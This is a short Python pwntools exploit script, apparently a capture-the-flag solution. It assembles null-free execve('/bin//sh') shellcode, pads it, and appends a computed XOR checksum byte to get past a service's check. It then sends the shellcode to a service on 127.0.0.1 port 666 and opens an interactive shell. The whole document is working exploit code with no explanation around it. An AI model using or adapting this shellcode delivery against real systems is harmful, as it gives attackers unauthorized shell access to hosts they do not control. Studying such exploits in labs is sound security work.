from pwn import *

context.update(arch='amd64', os='linux')

def xor(buf, length):
	result = 0
	for i in range(length):
		result ^= buf[i]
	return result

def main():
	
	sc = asm(r'''
	  	xor rdx, rdx
  		xor rsi, rsi
  		push rax
  		mov rbx, 0x68732f2f6e69622f
  		push rbx
  		lea rdi, [rsp]
  		mov al, 59
  		syscall
	''')	
	
	assert len(sc) < 0x1E
	assert (b'\x00' not in sc) and (b'\x90' not in sc)
	
	for i in range(len(sc), 0x1D): sc += b'\xCC'

	X = xor(sc, 0xF)
	Y = xor(sc[0xF:], 0xE)
	
	sc += bytes([X^Y])
	
	assert (b'\x00' not in sc) and (b'\x90' not in sc)

	io = remote('127.0.0.1', 666)
	io.sendlineafter('drift\n', sc)
	io.interactive()

if __name__ == '__main__':
	main()
